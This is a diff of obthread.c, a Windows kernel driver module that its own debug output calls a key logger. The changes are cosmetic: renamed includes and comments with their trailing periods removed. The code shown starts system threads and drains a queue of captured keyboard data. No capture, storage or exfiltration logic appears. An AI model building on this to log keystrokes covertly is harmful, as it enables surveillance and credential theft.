@@ -1,14 +1,14 @@
 /*
  * Module: obthread.c
  * Author: Christopher Wood
- * Description: Worker threads for use by outbound driver
+ * Description: Worker threads for use by driver
  * Environment: Kernel mode only
  */
 
-#include "obdriver.h"
-#include "obthread.h"
-#include "obhook.h"
-#include "obcompare.h"
+#include "driver.h"
+#include "thread.h"
+#include "hook.h"
+#include "compare.h"
 #include "ntddkbd.h"
 
 /* InitThreads */
@@ -18,20 +18,20 @@ InitThreads(
 	IN KEY_QUEUE *writeQueue
 	)
 {
-	// Local variables.
+	// Local variables
 	PDEVICE_EXTENSION pKeyboardDeviceExtension;
 	HANDLE hWorkerThread;
 	HANDLE hExtractThread;
 	NTSTATUS status;
 
-	// Retrieve device extension.
+	// Retrieve device extension
 	pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
 
-	// Set the thread terminate states to false.
+	// Set the thread terminate states to false
 	pKeyboardDeviceExtension->bExtractTerminate = false;
 	pKeyboardDeviceExtension->bWorkerTerminate = false;
 
-	// Create the threads.
+	// Create the threads
 	status	= PsCreateSystemThread(&hWorkerThread,
 								(ACCESS_MASK)0,
 								NULL,
@@ -57,7 +57,7 @@ InitThreads(
 		return status;
 	DbgPrint("Threads created successfully.\n");
 
-	// Obtain pointers to the thread objects.
+	// Obtain pointers to the thread objects
 	ObReferenceObjectByHandle(hWorkerThread,
 							THREAD_ALL_ACCESS,
 							NULL,
@@ -80,7 +80,7 @@ InitThreads(
 	DbgPrint("Key logger thread initialized; hExtractThread =  %x\n",
 		&pKeyboardDeviceExtension->pExtractThread);
 
-	// Close thread handles.
+	// Close thread handles
 	ZwClose(hWorkerThread);
 	ZwClose(hExtractThread);
 
@@ -93,17 +93,17 @@ ExtractThread(
 	IN PVOID pContext
 	)
 {
-	// Local variables.
+	// Local variables
 	PDEVICE_EXTENSION pKeyboardDeviceExtension;
 	PDEVICE_OBJECT pKeyboardDeviceObject;
 	PLIST_ENTRY pEntry;
 	KEY_DATA *pKeyData;
 
-	// Retrieve pointer to device extension and device object.
+	// Retrieve pointer to device extension and device object
 	pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pContext;
 	pKeyboardDeviceObject = pKeyboardDeviceExtension->pKeyboardDevice;
 
-	// Enter main thread loop.
+	// Enter main thread loop
 	while(true)
 	{
 		// Wait for KEY_DATA struct to become available in queue
@@ -114,11 +114,11 @@ ExtractThread(
 							NULL
 							);
 
-		// Pop off the first entry and save it for the time being.
+		// Pop off the first entry and save it for the time being
 		pEntry = ExInterlockedRemoveHeadList(&((pKeyboardDeviceExtension->bufferQueue).QueueListHead),
 												&((pKeyboardDeviceExtension->bufferQueue).lockQueue));
 
-		// Check to see if the thread isn't set to terminate.
+		// Check to see if the thread isn't set to terminate
 		if(pKeyboardDeviceExtension->bExtractTerminate == true)
 			PsTerminateSystemThread(STATUS_SUCCESS);
 
@@ -142,17 +142,17 @@ VOID WorkerThread(
 	)
 {
 	// implement..
-	// Local variables.
+	// Local variables
 	PDEVICE_EXTENSION pKeyboardDeviceExtension;
 	PDEVICE_OBJECT pKeyboardDeviceObject;
 	PLIST_ENTRY pEntry;
 	KEY_DATA *pKeyData;
 
-	// Retrieve pointer to device extension and device object.
+	// Retrieve pointer to device extension and device object
 	pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pContext;
 	pKeyboardDeviceObject = pKeyboardDeviceExtension->pKeyboardDevice;
 
-	// Enter main thread loop.
+	// Enter main thread loop
 	while(true)
 	{
 		// Wait for KEY_DATA struct to become available in queue
@@ -163,11 +163,11 @@ VOID WorkerThread(
 							NULL
 							);
 
-		// Pop off the first entry and save it for the time being.
+		// Pop off the first entry and save it for the time being
 		pEntry = ExInterlockedRemoveHeadList(&((pKeyboardDeviceExtension->bufferQueue).QueueListHead),
 												&((pKeyboardDeviceExtension->bufferQueue).lockQueue));
 
-		// Check to see if the thread isn't set to terminate.
+		// Check to see if the thread isn't set to terminate
 		if(pKeyboardDeviceExtension->bExtractTerminate == true)
 			PsTerminateSystemThread(STATUS_SUCCESS);
 
